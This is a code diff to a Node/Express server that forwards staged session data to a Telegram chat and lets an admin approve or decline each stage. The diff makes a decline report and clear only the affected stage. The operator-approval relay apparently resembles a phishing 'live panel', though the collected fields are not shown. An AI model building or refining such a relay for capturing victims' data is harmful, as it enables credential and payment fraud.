@@ -19,7 +19,7 @@ async function telegram(method, data) {
     throw new Error("Telegram environment variables are missing.");
   }
 
- const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`; 
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`; 
   
   const response = await fetch(url, {
     method: "POST",
@@ -133,12 +133,17 @@ app.get("/api/status", (req, res) => {
   const session = sessions.get(sessionId);
 
   if (!session) return res.status(404).json({ error: "Session missing." });
+  
+  // If the request comes from an older screen, ignore it
   if (session.stage !== stage) return res.json({ status: "idle" });
 
   const currentStatus = session.status;
 
+  // CORE FIX: Instead of dropping directly back to 'idle' globally,
+  // we change it to 'idle' but respond with a distinct status specifying the broken page
   if (currentStatus === "declined") {
-    session.status = "idle";
+    session.status = "idle"; 
+    return res.json({ status: `declined_${stage}` });
   }
 
   res.json({ status: currentStatus });
@@ -182,6 +187,7 @@ app.post("/telegram-webhook", async (req, res) => {
       });
 
     } else if (decision === "decline") {
+      // Clear out only the data of the affected page stage
       if (session.data) {
         session.data[stage] = "";
       }
@@ -192,7 +198,7 @@ app.post("/telegram-webhook", async (req, res) => {
       await telegram("editMessageText", {
         chat_id: CHAT_ID,
         message_id: query.message.message_id,
-        text: query.message.text + "\n\n<b>❌ DECLINED BY ADMIN (Field Cleared)</b>",
+        text: query.message.text + `\n\n<b>❌ DECLINED BY ADMIN (${stage.toUpperCase()} Cleared)</b>`,
         parse_mode: "HTML"
       });
     }
@@ -210,4 +216,5 @@ app.post("/telegram-webhook", async (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
